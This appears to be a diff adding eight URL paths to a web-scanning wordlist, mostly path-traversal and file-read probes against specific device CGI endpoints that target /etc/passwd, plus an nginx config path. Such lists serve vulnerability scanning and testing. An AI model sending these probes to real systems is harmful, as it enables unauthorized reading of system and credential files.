@@ -1,0 +1,8 @@
+/adm/file.cgi?next_file=%2fetc%2fpasswd
+/../../../../../../../../../../../../../etc/passwd
+/command/prima-factory.cgi
+/../../../../../etc/passwd
+/conf/nginx.conf
+/Security/users?auth={{b64auth}}
+/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
